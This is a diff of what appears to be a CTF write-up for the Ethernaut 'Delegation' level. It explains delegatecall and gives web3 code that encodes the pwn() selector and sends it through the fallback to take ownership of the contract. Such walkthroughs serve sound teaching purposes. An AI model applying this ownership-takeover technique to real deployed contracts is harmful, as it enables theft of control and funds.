@@ -74,9 +74,17 @@ await contract.transfer(instance, 25)
 ```
 
 ## 6. Delegation
-Be very very careful when using delegatecall. msg.sender, msg.data, msg.value are all preserved. Always do a check to ensure that msg.data.length == 0 if you don't want them to call any function. https://solidity.readthedocs.io/en/v0.4.25/types.html#address for more info. All I had to do was trigger the fallback function (note that it is not payable) with "pwn()" as the msg.value. https://web3js.readthedocs.io/en/1.0/web3-eth.html#eth-sendtransaction
+DelegateCall means you take the implementation logic of the function in the contract you're making this call to but using the storage of the calling contract. Since msg.sender, msg.data, msg.value are all preserved when performing a DelegateCall, you just needed to pass in a malicious msg.data i.e. the encoded payload of `pwn()` function to gain ownership of the `Delegation` contract.
 ```
-await contract.sendTransaction({data: web3.sha3("pwn()").slice(0, 10)})
+let payload = web3.eth.abi.encodeFunctionSignature({
+    name: 'pwn',
+    type: 'function',
+    inputs: []
+});
+
+await contract.sendTransaction({
+    data: payload
+});
 ```
 
 ## 7. Force
